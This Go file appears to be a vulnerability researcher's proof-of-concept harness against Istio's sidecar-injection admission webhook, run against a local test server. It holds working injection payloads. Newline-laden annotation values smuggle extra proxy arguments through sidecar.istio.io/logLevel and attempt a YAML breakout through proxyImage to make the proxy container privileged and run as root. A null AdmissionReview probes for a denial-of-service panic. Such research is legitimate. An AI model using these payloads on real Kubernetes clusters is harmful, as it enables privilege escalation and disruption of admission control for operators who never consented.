// Secondary probes against the REAL sidecar-injection handler:
//  (1) sidecar.istio.io/logLevel (UNVALIDATED, rendered UNQUOTED into proxy args)
//      -> inject arbitrary additional pilot-agent args.
//  (2) proxyImage payload that tries to set securityContext.privileged=true
//      -> bound the impact: colliding key, template's value should win (refutation).
//  (3) AdmissionReview with "request": null -> does the real handler panic (HTTP 500)
//      or handle gracefully? (DoS-of-admission probe)
//
// Run: go run /home/user/istio/.zeroday/scratch/webhook/repro_probe2.go
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"

	jsonpatch "github.com/evanphx/json-patch/v5"
	v1beta1 "k8s.io/api/admission/v1beta1"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"

	"istio.io/istio/pilot/pkg/model"
	"istio.io/istio/pkg/config/mesh"
	"istio.io/istio/pkg/config/mesh/meshwatcher"
	"istio.io/istio/pkg/kube/inject"
	"istio.io/istio/pkg/kube/multicluster"
)

const scratch = "/home/user/istio/.zeroday/scratch/webhook"

func must(err error) {
	if err != nil {
		panic(err)
	}
}

func buildWebhook() (*httptest.Server, func()) {
	cfg, err := os.ReadFile(filepath.Join(scratch, "real-inject-config.yaml"))
	must(err)
	vals, err := os.ReadFile(filepath.Join(scratch, "real-values.yaml"))
	must(err)
	dir, err := os.MkdirTemp("", "reprowh")
	must(err)
	cfgFile := filepath.Join(dir, "config")
	valFile := filepath.Join(dir, "values")
	must(os.WriteFile(cfgFile, cfg, 0o644))
	must(os.WriteFile(valFile, vals, 0o644))
	watcher, err := inject.NewFileWatcher(cfgFile, valFile)
	must(err)
	mc := mesh.DefaultMeshConfig()
	env := &model.Environment{Watcher: meshwatcher.NewTestWatcher(mc)}
	env.SetPushContext(&model.PushContext{})
	mux := http.NewServeMux()
	_, err = inject.NewWebhook(inject.WebhookParameters{
		Watcher: watcher, Port: 0, Env: env, Mux: mux, MultiCluster: multicluster.NewFakeController(),
	})
	must(err)
	srv := httptest.NewServer(mux)
	return srv, func() { srv.Close(); os.RemoveAll(dir) }
}

func post(srv *httptest.Server, body []byte) (int, []byte) {
	req, err := http.NewRequest(http.MethodPost, srv.URL+"/inject", bytes.NewReader(body))
	must(err)
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		// Server-side panic recovered by net/http closes the conn -> client sees EOF.
		return -1, []byte("transport error (server panic recovered / conn reset): " + err.Error())
	}
	defer resp.Body.Close()
	rb, err := io.ReadAll(resp.Body)
	must(err)
	return resp.StatusCode, rb
}

func reviewForPod(pod corev1.Pod) []byte {
	raw, err := json.Marshal(&pod)
	must(err)
	review := v1beta1.AdmissionReview{
		TypeMeta: metav1.TypeMeta{Kind: "AdmissionReview", APIVersion: "admission.k8s.io/v1beta1"},
		Request: &v1beta1.AdmissionRequest{
			Kind:      metav1.GroupVersionKind{Group: "", Version: "v1", Kind: "Pod"},
			Object:    runtime.RawExtension{Raw: raw},
			Operation: v1beta1.Create,
			Namespace: "default",
		},
	}
	b, err := json.Marshal(review)
	must(err)
	return b
}

func applyPatch(pod corev1.Pod, patch []byte) corev1.Pod {
	orig, err := json.Marshal(&pod)
	must(err)
	p, err := jsonpatch.DecodePatch(patch)
	must(err)
	patched, err := p.Apply(orig)
	must(err)
	var out corev1.Pod
	must(json.Unmarshal(patched, &out))
	return out
}

func find(cs []corev1.Container, n string) *corev1.Container {
	for i := range cs {
		if cs[i].Name == n {
			return &cs[i]
		}
	}
	return nil
}

func basePod(anns map[string]string) corev1.Pod {
	return corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name: "victim", Namespace: "default",
			Labels:      map[string]string{"sidecar.istio.io/inject": "true"},
			Annotations: anns,
		},
		Spec: corev1.PodSpec{Containers: []corev1.Container{{Name: "app", Image: "nginx"}}},
	}
}

func main() {
	srv, cleanup := buildWebhook()
	defer cleanup()

	// (1) logLevel UNQUOTED args injection: inject extra pilot-agent args.
	fmt.Println("=== (1) sidecar.istio.io/logLevel unquoted args injection ===")
	{
		payload := "warning\n    - --injected-flag=INJECTED_VIA_LOGLEVEL\n    - --another=2"
		pod := basePod(map[string]string{"sidecar.istio.io/logLevel": payload})
		st, rb := post(srv, reviewForPod(pod))
		var out v1beta1.AdmissionReview
		must(json.Unmarshal(rb, &out))
		if st != 200 || out.Response == nil {
			fmt.Printf("  HTTP %d resp=%v\n", st, string(rb))
		} else if len(out.Response.Patch) == 0 {
			msg := ""
			if out.Response.Result != nil {
				msg = out.Response.Result.Message
			}
			fmt.Printf("  no patch; allowed=%v msg=%q\n", out.Response.Allowed, msg)
		} else {
			p := applyPatch(pod, out.Response.Patch)
			proxy := find(p.Spec.Containers, "istio-proxy")
			if proxy == nil {
				proxy = find(p.Spec.InitContainers, "istio-proxy")
			}
			if proxy != nil {
				fmt.Printf("  istio-proxy args = %v\n", proxy.Args)
				inj := false
				for _, a := range proxy.Args {
					if a == "--injected-flag=INJECTED_VIA_LOGLEVEL" || a == "--another=2" {
						inj = true
					}
				}
				fmt.Printf("  ARG INJECTION CONFIRMED=%v\n", inj)
			}
		}
	}

	// (2) Refutation: try to set securityContext.privileged=true via proxyImage breakout.
	fmt.Println("=== (2) proxyImage -> securityContext.privileged=true (expected: refuted, dup key) ===")
	{
		payload := "" +
			"registry.istio.io/testing/proxyv2:latest\"\n" +
			"    securityContext:\n" +
			"      privileged: true\n" +
			"      runAsUser: 0\n" +
			"    terminationMessagePath: \"/dev/x"
		pod := basePod(map[string]string{"sidecar.istio.io/proxyImage": payload})
		st, rb := post(srv, reviewForPod(pod))
		var out v1beta1.AdmissionReview
		must(json.Unmarshal(rb, &out))
		if st != 200 || out.Response == nil {
			fmt.Printf("  HTTP %d resp=%v\n", st, string(rb))
		} else if len(out.Response.Patch) == 0 {
			msg := ""
			if out.Response.Result != nil {
				msg = out.Response.Result.Message
			}
			fmt.Printf("  no patch (injection produced invalid YAML / rejected). allowed=%v msg=%q\n", out.Response.Allowed, msg)
		} else {
			p := applyPatch(pod, out.Response.Patch)
			proxy := find(p.Spec.Containers, "istio-proxy")
			if proxy != nil && proxy.SecurityContext != nil {
				priv := proxy.SecurityContext.Privileged != nil && *proxy.SecurityContext.Privileged
				fmt.Printf("  istio-proxy privileged=%v (want false => refuted)\n", priv)
			} else {
				fmt.Printf("  istio-proxy securityContext nil\n")
			}
		}
	}

	// (3) AdmissionReview with request:null -> panic recovered as HTTP 500? DoS probe.
	fmt.Println("=== (3) AdmissionReview request:null (nil ar.Request) ===")
	{
		body := []byte(`{"kind":"AdmissionReview","apiVersion":"admission.k8s.io/v1beta1","request":null}`)
		st, rb := post(srv, body)
		fmt.Printf("  HTTP %d body=%s\n", st, string(rb))
	}
}
